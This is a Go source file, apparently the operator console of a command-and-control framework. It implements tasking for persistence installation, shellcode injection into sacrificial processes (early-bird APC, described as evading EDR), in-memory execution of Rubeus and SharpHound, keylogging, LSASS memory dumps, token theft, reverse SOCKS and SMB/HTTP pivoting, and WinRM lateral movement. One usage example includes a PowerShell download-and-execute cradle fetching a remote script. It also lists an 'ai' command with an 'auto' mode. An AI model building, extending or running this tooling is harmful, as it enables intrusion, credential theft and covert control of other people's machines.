		return
	}

	labels := map[string]string{
		"exe":       "agent.exe",
		"dll":       "agent.dll",
		"elf":       "linux ELF",
		"bin":       "shellcode .bin",
		"enc":       "shellcode encrypted",
		"stub":      "decryptor stub.c",
		"html":      "html smuggler",
		"lnk":       "shortcut .lnk",
		"iso":       "ISO image",
		"hta":       "HTA dropper",
		"bin_stage": "shellcode stage URL",
	}
	for _, k := range []string{"exe", "dll", "elf", "bin", "enc", "stub", "html", "lnk", "iso", "hta", "bin_stage"} {
		if v, okV := resp[k]; okV && v != "" {
			ok("%-22s %s%s%s", labels[k]+":", cBCyan, v, cReset)
		}
	}
	if _, okV := resp["bin_stage"]; okV {
		warn("payload staged — max 5 downloads, auto-expires")
	}
}

// ── persist ───────────────────────────────────────────────────────────────

const persistUsage = `usage: persist <method> <cmd> [name]

  Windows methods:
    registry   HKCU Run key (requires user)
    schtask    Scheduled task (requires user)
    startup    Startup folder .bat (requires user)
    service    Windows service (requires admin)
    wmi        WMI event subscription (requires admin)
    enum       list all installed persistence on this host

  Linux methods:
    crontab    @reboot cron entry
    bashrc     ~/.bashrc entry
    rc.local   /etc/rc.local entry (requires root)
    systemd    systemd service (user or system)
    enum       list all installed persistence on this host

  name: service/task name (optional, default: WindowsUpdate)

examples:
  persist registry "C:\Users\user\AppData\Local\svc.exe"
  persist schtask "C:\Windows\Temp\agent.exe" MicrosoftUpdate
  persist crontab "/tmp/agent" MicrosoftEdgeUpdate
  persist enum`

func (cl *CLI) cmdPersist(args []string) {
	if len(args) == 0 {
		fmt.Println(persistUsage)
		return
	}
	method := args[0]
	if method == "enum" || method == "check" || method == "list" {
		argJSON, _ := json.Marshal(map[string]string{"method": method})
		cl.cmdTask(cl.current, "PERSIST", string(argJSON), nil)
		return
	}
	if len(args) < 2 {
		fmt.Println(persistUsage)
		return
	}
	cmd := args[1]
	name := ""
	if len(args) >= 3 {
		name = args[2]
	}
	argJSON, _ := json.Marshal(map[string]string{"method": method, "cmd": cmd, "name": name})
	cl.cmdTask(cl.current, "PERSIST", string(argJSON), nil)
}

// ── fork & run ────────────────────────────────────────────────────────────

const forkrunUsage = `usage: forkrun <shellcode.bin> [sacrificial_process]

  Injects shellcode into a sacrificial process to protect the agent.

  sacrificial_process: full process path (default: svchost.exe)

  The shellcode runs in a separate process that is terminated upon completion.
  Output is captured and returned as the task result.

examples:
  forkrun /tmp/beacon.bin
  forkrun /tmp/beacon.bin C:\Windows\System32\notepad.exe`

func (cl *CLI) cmdForkRun(args []string) {
	if len(args) == 0 {
		fmt.Println(forkrunUsage)
		return
	}
	scPath := args[0]
	process := ""
	if len(args) >= 2 {
		process = args[1]
	}
	data, err := os.ReadFile(scPath)
	if err != nil {
		errLine("reading shellcode: %s", err)
		return
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	cl.cmdTask(cl.current, "FORK_RUN", process, []byte(encoded))
}

// ── early-bird APC injection ──────────────────────────────────────────────

const injectApcUsage = `usage: inject-apc <shellcode.bin> [sacrificial_process]

  Injects shellcode via QueueUserAPC (early-bird) into a sacrificial process.
  The APC runs before the entry point, before the EDR can inspect.
  Does not overwrite RIP — more stable than thread hijacking in some environments.

  sacrificial_process: full path (default: RuntimeBroker.exe / dllhost.exe)

examples:
  inject-apc /tmp/beacon.bin
  inject-apc /tmp/beacon.bin C:\Windows\System32\dllhost.exe`

func (cl *CLI) cmdInjectAPC(args []string) {
	if len(args) == 0 {
		fmt.Println(injectApcUsage)
		return
	}
	data, err := os.ReadFile(args[0])
	if err != nil {
		errLine("reading shellcode: %s", err)
		return
	}
	process := ""
	if len(args) >= 2 {
		process = args[1]
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	cl.cmdTask(cl.current, "INJECT_APC", process, []byte(encoded))
}

// ── execute assembly ──────────────────────────────────────────────────────

const execAsmUsage = `usage: dotnet-asm <assembly.exe> [sacrificial_process]

  Executes a .NET assembly in memory using a sacrificial process.
  The assembly is converted to shellcode with donut on the server (go-donut).
  Combines fork-run with automatic conversion — no local donut required.

  Requires: go-donut available on the server (go run github.com/Binject/go-donut).

examples:
  dotnet-asm /tmp/Rubeus.exe
  dotnet-asm /tmp/SharpHound.exe C:\Windows\System32\dllhost.exe`

func (cl *CLI) cmdExecAsm(args []string) {
	if len(args) == 0 {
		fmt.Println(execAsmUsage)
		return
	}
	data, err := os.ReadFile(args[0])
	if err != nil {
		errLine("reading assembly: %s", err)
		return
	}
	info("converting with donut on server...")
	sc, err := cl.c.Donut(data)
	if err != nil {
		errLine("donut: %s", err)
		return
	}
	ok("shellcode: %s%d bytes%s", cBGreen, len(sc), cReset)
	process := ""
	if len(args) >= 2 {
		process = args[1]
	}
	encoded := base64.StdEncoding.EncodeToString(sc)
	cl.cmdTask(cl.current, "FORK_RUN", process, []byte(encoded))
}

// ── dotnet-exec (native CLR host, in-process) ────────────────────────────

const execDotnetUsage = `usage: dotnet-exec <assembly.exe> [args...] [--type <TypeName>] [--method <MethodName>]

  Executes a .NET assembly IN-PROCESS in the agent using native CLR hosting
  (mscoree.dll COM API): ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost.

  Unlike dotnet-asm (which converts to shellcode with donut and uses fork-run),
  dotnet-exec loads the CLR directly into the agent process and captures
  Console.Write* output via pipe redirection.

  Equivalent to: Cobalt Strike execute-assembly / Havoc dotnet inline-execute

  --type   Full entry class name (auto-detected if omitted)
           Example: --type Rubeus.Program
  --method Static entry method name (default: Main)

  Supported tools (auto-detection): Rubeus, SharpHound, Certify,
  SharpView, Seatbelt, InternalMonologue, SharpUp, ADRecon, etc.

  Note: requires .NET Framework 4.x on the Windows host.

examples:
  dotnet-exec /tmp/Rubeus.exe kerberoast /outfile:hashes.txt
  dotnet-exec /tmp/SharpHound.exe -c All
  dotnet-exec /tmp/Seatbelt.exe -group=all
  dotnet-exec /tmp/Custom.exe --type MyNS.EntryClass --method Run arg1`

func (cl *CLI) cmdExecDotnet(args []string) {
	if len(args) == 0 {
		fmt.Println(execDotnetUsage)
		return
	}

	// Parse --type and --method flags; remaining args go to the assembly
	var asmPath, typeName, methodName string
	var asmArgs []string
	i := 0
	for i < len(args) {
		switch args[i] {
		case "--type":
			if i+1 < len(args) {
				i++
				typeName = args[i]
			}
		case "--method":
			if i+1 < len(args) {
				i++
				methodName = args[i]
			}
		default:
			if asmPath == "" {
				asmPath = args[i]
			} else {
				asmArgs = append(asmArgs, args[i])
			}
		}
		i++
	}

	if asmPath == "" {
		fmt.Println(execDotnetUsage)
		return
	}

	data, err := os.ReadFile(asmPath)
	if err != nil {
		errLine("reading assembly: %s", err)
		return
	}

	asmB64 := base64.StdEncoding.EncodeToString(data)
	taskArgs := fmt.Sprintf(`{"asm":%q,"args":%q,"type":%q,"method":%q}`,
		asmB64, strings.Join(asmArgs, " "), typeName, methodName)

	info("dotnet-exec: %s%s%s (%d bytes) → in-process CLR", cBCyan, filepath.Base(asmPath), cReset, len(data))
	cl.cmdTask(cl.current, "DOTNET_EXEC", taskArgs, nil)
}

// ── keylogger ─────────────────────────────────────────────────────────────

const keylogUsage = `usage: keylog <start|stop|dump>

  start  — installs global keyboard hook (WH_KEYBOARD_LL)
  stop   — uninstalls the hook and stops capture
  dump   — returns and clears the captured buffer`

func (cl *CLI) cmdKeylog(args []string) {
	if len(args) == 0 {
		fmt.Println(keylogUsage)
		return
	}
	switch args[0] {
	case "start":
		cl.cmdTask(cl.current, "KEYLOG_START", "", nil)
	case "stop":
		cl.cmdTask(cl.current, "KEYLOG_STOP", "", nil)
	case "dump":
		cl.cmdTask(cl.current, "KEYLOG_DUMP", "", nil)
	default:
		fmt.Println(keylogUsage)
	}
}

// ── clipboard ─────────────────────────────────────────────────────────────

func (cl *CLI) cmdClip() {
	cl.cmdTask(cl.current, "CLIP_GET", "", nil)
}

// ── LSASS minidump ────────────────────────────────────────────────────────

const minidumpUsage = `usage: minidump [pid]
  Dumps lsass.exe memory (or the specified PID) as a .dmp file
  and uploads it to the server. Requires administrator privileges.

  No PID: auto-locates lsass.exe.
  With PID: uses the specified process.

Examples:
  minidump
  minidump 820`

func (cl *CLI) cmdMinidump(args []string) {
	pid := ""
	if len(args) > 0 {
		pid = args[0]
	}
	cl.cmdTask(cl.current, "MINIDUMP", pid, nil)
}

// ── Port scan ─────────────────────────────────────────────────────────────

const portScanUsage = `usage: port-scan <target> [ports] [timeout_ms]
  TCP connect scan from the agent. No ports → host discovery (ARP + TCP).

  target:     192.168.1.1                individual IP
              192.168.1.0/24             CIDR (entire subnet)
              192.168.1.1-20             last octet range
              192.168.1.1-192.168.1.50  full IP range
              dc01.corp.local            hostname
  ports:      omitted                   host discovery (ARP + TCP fallback)
              22,80,443                 individual ports
              1-1024                    range
              22,80,443-500             mixed
  timeout_ms: per-probe timeout in ms (default 500)

Host discovery (no ports):
  Windows — SendARP (iphlpapi): no elevation, returns MAC
  Linux   — UDP trigger + /proc/net/arp: no raw sockets, returns MAC
  Fallback — TCP connect to common ports (for routed subnets)

Examples:
  port-scan 192.168.1.0/24               detect live hosts
  port-scan 192.168.1.0/24 22,80,445,3389 300
  port-scan 192.168.1.1-20 80,443,8080
  port-scan dc01.corp.local 88,135,389,445,636,3268`

func (cl *CLI) cmdPortScan(args []string) {
	if len(args) < 2 {
		fmt.Println(portScanUsage)
		return
	}
	taskArgs := strings.Join(args, " ")
	cl.cmdTask(cl.current, "PORT_SCAN", taskArgs, nil)
}

// ── SMB named pipe pivot server ───────────────────────────────────────────

const linkUsage = `usage: link start [pipename]  — start named pipe server (SMB pivot)
       link stop                — stop named pipe server

  Makes the agent listen on a Windows named pipe.
  Child agents compiled with SMB transport connect through it,
  and the pivot agent forwards their traffic to the C2 server (lateral movement).

  Windows only. Requires the agent to be reachable via SMB.

  Steps:
    1. link start                   ← activates the server at \\.\pipe\svcctl
    2. build smb <host> 60 20 smb-pipe=\\TARGET\pipe\svcctl  ← compile child agent
    3. Run the child agent on the target system
    4. agents  ← the child agent appears in the list

examples:
  link start
  link start \\.\pipe\evil
  link stop`

func (cl *CLI) cmdLink(args []string) {
	if len(args) == 0 {
		fmt.Println(linkUsage)
		return
	}
	switch args[0] {
	case "start":
		pipeName := ""
		if len(args) >= 2 {
			pipeName = args[1]
		}
		cl.cmdTask(cl.current, "PIPE_START", pipeName, nil)
	case "stop":
		cl.cmdTask(cl.current, "PIPE_STOP", "", nil)
	default:
		fmt.Println(linkUsage)
	}
}

// ── reverse SOCKS5 ───────────────────────────────────────────────────────

const rsocksUsage = `usage: rsocks start [socks_port] [user:pass]   — start reverse SOCKS5 (default :1080)
       rsocks stop                               — stop

  The agent connects OUTBOUND to the C2 server and creates a reverse tunnel.
  The operator uses 127.0.0.1:<socks_port> as a SOCKS5 proxy into the internal network.

  Unlike direct SOCKS5, works even when the agent is behind NAT
  or a firewall that blocks incoming connections.

  Configure proxychains: socks5  127.0.0.1  1080
  With auth:             socks5  127.0.0.1  1080  user  pass

examples:
  rsocks start
  rsocks start 9050
  rsocks start 9050 redteam:S3cr3t
  rsocks stop`

func (cl *CLI) cmdRSocks(args []string) {
	if len(args) == 0 {
		fmt.Println(rsocksUsage)
		return
	}
	switch args[0] {
	case "start":
		socksPort := 1080
		var rUser, rPass string
		if len(args) >= 2 {
			if p, err := strconv.Atoi(args[1]); err == nil {
				socksPort = p
			}
		}
		if len(args) >= 3 {
			if idx := strings.Index(args[2], ":"); idx > 0 {
				rUser = args[2][:idx]
				rPass = args[2][idx+1:]
			}
		}
		resp, err := cl.c.StartRSocks(cl.current, socksPort, rUser, rPass)
		if err != nil {
			errLine("%s", err)
			return
		}
		ok("reverse SOCKS5 active")
		info("  SOCKS5 operator: %s127.0.0.1:%v%s", cBCyan, resp["socks_port"], cReset)
		info("  agent callback port: %s%v%s", cBCyan, resp["callback_port"], cReset)
		if rUser != "" {
			info("  auth: %s%s%s:***", cBYellow, rUser, cReset)
		}
	case "stop":
		if err := cl.c.StopRSocks(cl.current); err != nil {
			errLine("%s", err)
			return
		}
		ok("reverse SOCKS5 stopped")
	default:
		fmt.Println(rsocksUsage)
	}
}

// ── HTTP pivot server ─────────────────────────────────────────────────────

const httpivotUsage = `usage: httpivot start [port]   — start internal HTTP proxy (default :8888)
       httpivot stop             — stop

  The agent listens on the given port as an HTTP server.
  Child agents compiled pointing to http://PIVOT:PORT connect here.
  The pivot forwards their traffic to the real C2 server (transparent HTTP proxy).

  Useful when SMB is filtered between segments but HTTP is allowed.

  Steps:
    1. httpivot start 8080          ← activates the proxy on the agent
    2. build http <pivot_ip>:8080   ← compile child agent
    3. agents                       ← the child appears as a normal agent

examples:
  httpivot start
  httpivot start 8080
  httpivot stop`

func (cl *CLI) cmdHTTPivot(args []string) {
	if len(args) == 0 {
		fmt.Println(httpivotUsage)
		return
	}
	switch args[0] {
	case "start":
		port := "8888"
		if len(args) >= 2 {
			port = args[1]
		}
		cl.cmdTask(cl.current, "HTTP_PIVOT_START", port, nil)
	case "stop":
		cl.cmdTask(cl.current, "HTTP_PIVOT_STOP", "", nil)
	default:
		fmt.Println(httpivotUsage)
	}
}

// ── WinRM lateral movement ────────────────────────────────────────────────

const winrmUsage = `usage: winrm exec  <target> <user> <pass> <cmd>
       winrm deploy <target> <user> <pass> <powershell_cradle>

  Executes commands on a remote Windows host via WinRM (port 5985).
  Uses PowerShell Invoke-Command — requires a Windows agent with PS available.
  The password does NOT appear in the process list (uses -EncodedCommand).

  deploy: executes a PS payload (download cradle) on the remote host.
          Useful for deploying a new agent on an internal machine.

examples:
  winrm exec  192.168.1.10 CORP\\Administrator Passw0rd! whoami
  winrm exec  dc01 alice@corp.local P@ss123 "Get-ADUser -Filter *"
  winrm deploy 192.168.1.20 CORP\\admin P@ss "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')"
`

func (cl *CLI) cmdWinRM(args []string) {
	if len(args) < 5 {
		fmt.Print(winrmUsage)
		return
	}
	sub := args[0]
	target, user, pass := args[1], args[2], args[3]
	rest := strings.Join(args[4:], " ")

	switch sub {
	case "exec":
		argJSON, _ := json.Marshal(map[string]string{
			"target": target, "user": user, "pass": pass, "cmd": rest,
		})
		cl.cmdTask(cl.current, "WINRM_EXEC", string(argJSON), nil)
	case "deploy":
		argJSON, _ := json.Marshal(map[string]string{
			"target": target, "user": user, "pass": pass, "payload": rest,
		})
		cl.cmdTask(cl.current, "WINRM_DEPLOY", string(argJSON), nil)
	default:
		fmt.Print(winrmUsage)
	}
}

// ── role management ───────────────────────────────────────────────────────

const roleUsage = `usage: role <subcommand>

  list                        list roles for all operators
  set <operator> <role>       assign role (admin|operator|viewer)

  Only operators with the 'admin' role can use this command.
  The default role is 'operator' if none has been assigned.

  Permissions by role:
    viewer    read-only (agents, results, report)
    operator  tasks + build + creds (default)
    admin     all + role management

examples:
  role list
  role set alice admin
  role set bob viewer`

func (cl *CLI) cmdRole(args []string) {
	if len(args) == 0 {
		fmt.Println(roleUsage)
		return
	}
	switch args[0] {
	case "list", "ls":
		raw, err := cl.c.ListRoles()
		if err != nil {
			errLine("%s", err)
			return
		}
		var roles map[string]string
		if err := json.Unmarshal(raw, &roles); err != nil {
			errLine("parse: %s", err)
			return
		}
		if len(roles) == 0 {
			info("(no roles assigned — all default to 'operator')")
			return
		}
		fmt.Printf("\n  "+cBold+"%-25s  %s\n"+cReset, "OPERATOR", "ROLE")
		fmt.Println("  " + cDim + strings.Repeat("─", 40) + cReset)
		for op, role := range roles {
			var rc string
			switch role {
			case "admin":
				rc = cBRed
			case "viewer":
				rc = cBCyan
			default:
				rc = cBYellow
			}
			fmt.Printf("  %-25s  %s%s%s\n", op, rc, role, cReset)
		}
		fmt.Println()

	case "set":
		if len(args) < 3 {
			warn("usage: role set <operator> <role>")
			return
		}
		op, role := args[1], args[2]
		if err := cl.c.SetRole(op, role); err != nil {
			errLine("%s", err)
			return
		}
		ok("%s%s%s → %s%s%s", cBYellow, op, cReset, cBGreen, role, cReset)

	default:
		fmt.Println(roleUsage)
	}
}

// ── token / socks / portfwd ───────────────────────────────────────────────

func (cl *CLI) cmdToken(args []string) {
	if len(args) == 0 {
		fmt.Print(`token commands:
  token whoami             — current token info
  token steal <pid>        — steal token from process
  token make <user> <pass> — create token (domain\user or user@domain)
  token drop               — revert to original token
`)
		return
	}
	switch args[0] {
	case "whoami":
		cl.cmdTask(cl.current, "TOKEN_WHOAMI", "", nil)
	case "steal":
		if len(args) < 2 {
			fmt.Println("usage: token steal <pid>")
			return
		}
		cl.cmdTask(cl.current, "TOKEN_STEAL", args[1], nil)
	case "make":
		if len(args) < 3 {
			fmt.Println(`usage: token make <domain\user> <pass>`)
			return
		}
		cl.cmdTask(cl.current, "TOKEN_MAKE", args[1]+" "+args[2], nil)
	case "drop":
		cl.cmdTask(cl.current, "TOKEN_DROP", "", nil)
	default:
		fmt.Println("unknown token subcommand:", args[0])
	}
}

func (cl *CLI) cmdSocks(args []string) {
	if len(args) == 0 {
		fmt.Println("usage: socks <port> [user:pass]  |  socks stop")
		return
	}
	switch args[0] {
	case "stop":
		cl.cmdTask(cl.current, "SOCKS_STOP", "", nil)
	default:
		taskArgs := args[0]
		if len(args) >= 2 {
			taskArgs += " " + args[1]
		}
		cl.cmdTask(cl.current, "SOCKS_START", taskArgs, nil)
	}
}

func (cl *CLI) cmdPortFwd(args []string) {
	if len(args) == 0 {
		fmt.Print(`portfwd commands:
  portfwd add <lport> <rhost> <rport>  — forward agent's :<lport> to rhost:rport
  portfwd del <lport>                  — stop forward
  portfwd list                         — list active forwards
`)
		return
	}
	switch args[0] {
	case "add":
		if len(args) < 4 {
			fmt.Println("usage: portfwd add <lport> <rhost> <rport>")
			return
		}
		cl.cmdTask(cl.current, "PORTFWD_ADD", strings.Join(args[1:4], " "), nil)
	case "del":
		if len(args) < 2 {
			fmt.Println("usage: portfwd del <lport>")
			return
		}
		cl.cmdTask(cl.current, "PORTFWD_DEL", args[1], nil)
	case "list":
		cl.cmdTask(cl.current, "PORTFWD_LIST", "", nil)
	default:
		fmt.Println("unknown portfwd subcommand:", args[0])
	}
}

// ── BOF ───────────────────────────────────────────────────────────────────

// cmdBOF sends a Beacon Object File task.
// Accepts a file path OR a short name resolved from bof/**/.
func (cl *CLI) cmdBOF(args []string) {
	if len(args) < 1 {
		fmt.Print(`usage: bof <name|file.o> [val:type ...]

subcommands:
  bof install        download/update BOF collections in bof/
  bof list           list available BOFs by name

argument types:
  text:z             C string (null-terminated)
  text:Z             wide string (UTF-16LE)
  42:i               int32
  256:s              int16
  /path/data.bin:b   binary file

examples:
  bof arp                           resolve by short name
  bof nanodump                      LSASS dump (requires SeDebugPrivilege)
  bof ldapsearch DC=corp,DC=com:z LDAP:z (LDAP 389):i
  bof /tmp/custom.x64.o arg:z
`)
		return
	}

	bofPath := resolveBof(args[0])
	if bofPath == "" {
		errLine("BOF not found: %q  (try: bof list)", args[0])
		return
	}
	if bofPath != args[0] {
		info("resolved: %s%s%s", cBCyan, bofPath, cReset)
	}

	coffData, err := os.ReadFile(bofPath)
	if err != nil {
		errLine("reading %s: %s", bofPath, err)
		return
	}

	var argsBuf bytes.Buffer
	for _, a := range args[1:] {
		packed, e := packBOFArg(a)
		if e != nil {
			errLine("arg: %s", e)
			return
		}
		argsBuf.Write(packed)
	}

	argsB64 := ""
	if argsBuf.Len() > 0 {
		argsB64 = base64.StdEncoding.EncodeToString(argsBuf.Bytes())
	}

	info("BOF %s%s%s (%d bytes)", cBCyan, filepath.Base(bofPath), cReset, len(coffData))
	cl.cmdTask(cl.current, "BOF", argsB64, coffData)
}

// packBOFArg packs one "value:type" argument into the beacon data format.
func packBOFArg(spec string) ([]byte, error) {
	idx := strings.LastIndex(spec, ":")
	if idx < 0 {
		return nil, fmt.Errorf("%q — format must be value:type (z/Z/i/s/b)", spec)
	}
	val, typ := spec[:idx], spec[idx+1:]

	var buf bytes.Buffer
	switch typ {
	case "z": // null-terminated C string
		data := append([]byte(val), 0)
		_ = binary.Write(&buf, binary.BigEndian, uint32(len(data)))
		buf.Write(data)

	case "Z": // UTF-16LE wide string
		wc := utf16.Encode([]rune(val))
		wc = append(wc, 0)
		b := make([]byte, len(wc)*2)
		for k, v := range wc {
			binary.LittleEndian.PutUint16(b[k*2:], v)
		}
		_ = binary.Write(&buf, binary.BigEndian, uint32(len(b)))
		buf.Write(b)

	case "i": // int32 big-endian
		n, e := strconv.ParseInt(val, 0, 32)
		if e != nil {
			return nil, fmt.Errorf("%q: %w", spec, e)
		}
		_ = binary.Write(&buf, binary.BigEndian, int32(n))

	case "s": // int16 big-endian
		n, e := strconv.ParseInt(val, 0, 16)
		if e != nil {
			return nil, fmt.Errorf("%q: %w", spec, e)
		}
		_ = binary.Write(&buf, binary.BigEndian, int16(n))

	case "b": // raw binary file
		data, e := os.ReadFile(val)
		if e != nil {
			return nil, fmt.Errorf("%q: read file: %w", spec, e)
		}
		_ = binary.Write(&buf, binary.BigEndian, uint32(len(data)))
		buf.Write(data)

	default:
		return nil, fmt.Errorf("unknown type %q (use z, Z, i, s, b)", typ)
	}
	return buf.Bytes(), nil
}

// ── chat ──────────────────────────────────────────────────────────────────

// chatPoller corre en background y muestra mensajes nuevos fuera del modo chat.
func (cl *CLI) chatPoller() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		raw, err := cl.c.ChatSince(cl.lastMsgID.Load())
		if err != nil {
			continue
		}
		var msgs []*server.ChatMessage
		if json.Unmarshal(raw, &msgs) != nil || len(msgs) == 0 {
			continue
		}
		for _, m := range msgs {
			cl.lastMsgID.Store(m.ID)
			// En modo chat el poller no imprime (el modo chat lo hace él mismo)
			if cl.chatMode.Load() {
				continue
			}
			if cl.rl != nil {
				cl.rl.Clean()
			}
			cl.printChatMsg(m)
			if cl.rl != nil {
				cl.rl.Refresh()
			}
		}
	}
}

func (cl *CLI) printChatMsg(m *server.ChatMessage) {
	ts := m.Timestamp.Format("15:04:05")
	if m.Operator == "sistema" {
		fmt.Printf("\r"+cDim+"[%s]"+cReset+" "+cBYellow+"%s"+cReset+"\n", ts, m.Text)
	} else {
		fmt.Printf("\r"+cDim+"[%s]"+cReset+" "+cBCyan+"%s"+cReset+": %s\n", ts, m.Operator, m.Text)
	}
}

func (cl *CLI) cmdChat() {
	cl.chatMode.Store(true)
	defer cl.chatMode.Store(false)

	// Mostrar últimos mensajes del historial
	raw, _ := cl.c.ChatSince(cl.lastMsgID.Load() - 20)
	var msgs []*server.ChatMessage
	if json.Unmarshal(raw, &msgs) == nil {
		for _, m := range msgs {
			cl.printChatMsg(m)
		}
	}

	fmt.Println(cDim + "── chat mode (type to send, 'exit' or Ctrl+C to leave) ──" + cReset)

	chatRL, err := readline.NewEx(&readline.Config{
		Prompt:          cBCyan + "you" + cReset + " " + cBWhite + ">" + cReset + " ",
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		errLine("readline: %s", err)
		return
	}
	defer chatRL.Close()

	// Poller dedicado mientras estamos en modo chat
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if !cl.chatMode.Load() {
				return
			}
			raw, err := cl.c.ChatSince(cl.lastMsgID.Load())
			if err != nil {
				continue
			}
			var newMsgs []*server.ChatMessage
			if json.Unmarshal(raw, &newMsgs) != nil || len(newMsgs) == 0 {
				continue
			}
			for _, m := range newMsgs {
				cl.lastMsgID.Store(m.ID)
				chatRL.Clean()
				cl.printChatMsg(m)
				chatRL.Refresh()
			}
		}
	}()

	for {
		line, err := chatRL.Readline()
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "exit" || line == "quit" {
			break
		}
		if err := cl.c.ChatPost(line); err != nil {
			fmt.Println("error sending message:", err)
		}
	}
	fmt.Println("\033[33m-- leaving chat --\033[0m")
}

// agentMonitor polls agents every 10s and prints connect/disconnect notifications.
func (cl *CLI) agentMonitor() {
	type agentState struct {
		stale  bool
		active bool
	}
	known := map[string]agentState{}

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		raw, err := cl.c.Agents()
		if err != nil {
			continue
		}
		var agents []*server.Agent
		if json.Unmarshal(raw, &agents) != nil {
			continue
		}
		for _, a := range agents {
			prev, seen := known[a.ID]
			curStale := server.IsStale(a)
			cur := agentState{stale: curStale, active: a.Active}
			if seen {
				if !prev.stale && curStale {
					cl.notify(pfxWarn + "agent " + cBYellow + a.ID[:8] + cReset + " (" + a.Username + "@" + a.Hostname + ") disconnected")
				} else if prev.stale && !curStale && a.Active {
					cl.notify(pfxOK + "agent " + cBGreen + a.ID[:8] + cReset + " (" + a.Username + "@" + a.Hostname + ") reconnected")
				}
			}
			known[a.ID] = cur
		}
	}
}

// serverMonitor pings the server every 10s and prints a notification when
// connectivity is lost or restored.
func (cl *CLI) serverMonitor() {
	up := true // assume up at start — first failure will trigger the alert
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		err := cl.c.Ping()
		if err != nil && up {
			up = false
			cl.notify(pfxWarn + cBRed + "server unreachable — connection lost" + cReset)
		} else if err == nil && !up {
			up = true
			cl.notify(pfxOK + "server connection restored")
		}
	}
}

func (cl *CLI) notify(msg string) {
	if aiActive.Load() != 0 {
		return
	}
	if cl.rl != nil {
		cl.rl.Clean()
	}
	fmt.Printf("\r%s\n", msg)
	if cl.rl != nil {
		cl.rl.Refresh()
	}
}

func (cl *CLI) cmdOperators() {
	ops, err := cl.c.Operators()
	if err != nil {
		errLine("%s", err)
		return
	}
	if len(ops) == 0 {
		info("no operators online")
		return
	}
	info("operators online (%s%d%s):", cBGreen, len(ops), cReset)
	for _, op := range ops {
		fmt.Printf("  %s·%s %s%s%s\n", cDim, cReset, cBGreen, op, cReset)
	}
}

func (cl *CLI) logCmd(parts []string) {
	if len(parts) == 0 {
		return
	}
	skip := map[string]bool{
		"help": true, "exit": true, "quit": true,
		"chat": true, "operators": true,
	}
	if skip[parts[0]] {
		return
	}
	op := cl.operator
	if op == "" {
		op = "operator"
	}
	AppendLocalEvent(op, parts[0], strings.Join(parts, " "))
}

// ── readline completion ───────────────────────────────────────────────────

func (cl *CLI) complete(line string) []string {
	parts := strings.Fields(line)
	if len(parts) == 0 || (len(parts) == 1 && !strings.HasSuffix(line, " ")) {
		prefix := ""
		if len(parts) == 1 {
			prefix = parts[0]
		}
		var cmds []string
		cmds = append(cmds, globalCmds...)
		if cl.current != "" {
			cmds = append(cmds, sessionCmds...)
		}
		return filterPrefix(cmds, prefix)
	}
	cmd := parts[0]
	switch cmd {
	case "use", "kill":
		return filterPrefix(cl.agentIDs(), lastWord(parts, line))

	case "agents":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"del"}, lastWord(parts, line))
		}
		if parts[1] == "del" {
			return filterPrefix(cl.agentIDs(), lastWord(parts, line))
		}

	case "help":
		return filterPrefix(helpTopics, lastWord(parts, line))

	case "build":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(buildTransports, lastWord(parts, line))
		}

	case "listener":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(listenerSubcmds, lastWord(parts, line))
		}
		if len(parts) == 2 || (len(parts) == 3 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(listenerProtos, lastWord(parts, line))
		}

	case "plugins":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(pluginSubcmds, lastWord(parts, line))
		}

	case "stage2", "upload", "inject":
		return fileCompletions(lastWord(parts, line))

	case "bof":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			// Complete install/list + known BOF names + file paths
			prefix := lastWord(parts, line)
			opts := append([]string{"install", "list"}, bofNames()...)
			named := filterPrefix(opts, prefix)
			files := fileCompletions(prefix)
			return append(named, files...)
		}
		// Subsequent args: file completions for :b type
		return fileCompletions(lastWord(parts, line))

	case "expose":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"cloudflare", "chisel", "ngrok", "status", "stop"}, lastWord(parts, line))
		}

	case "kerbrute":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"enum", "brute", "spray"}, lastWord(parts, line))
		}
		// segundo argumento: wordlist (archivo)
		if len(parts) == 2 || (len(parts) == 3 && !strings.HasSuffix(line, " ")) {
			return fileCompletions(lastWord(parts, line))
		}

	case "asrep", "spray", "enum", "secretsdump", "bloodhound",
		"kerberoast", "wmiexec", "psexec", "smbexec", "dcomexec", "atexec",
		"gettgt", "getst", "lookupsid", "samrdump", "rpcdump",
		"getadusers", "getadcomputers", "finddelegation", "getlaps", "getgpp",
		"mssqlclient", "smbclient", "dacledit", "rbcd", "addcomputer", "changepasswd":
		// TAB en flags de fichero
		lw := lastWord(parts, line)
		prev := ""
		if len(parts) >= 2 {
			prev = parts[len(parts)-1]
		}
		if strings.HasSuffix(line, " ") && len(parts) >= 1 {
			prev = parts[len(parts)-1]
		}
		if prev == "-u" || prev == "-w" || prev == "-tf" {
			return fileCompletions(lw)
		}

	case "impacket":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(impacketTools, lastWord(parts, line))
		}

	case "ai":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix([]string{"chat", "auto"}, lastWord(parts, line))
		}

	case "report":
		lw := lastWord(parts, line)
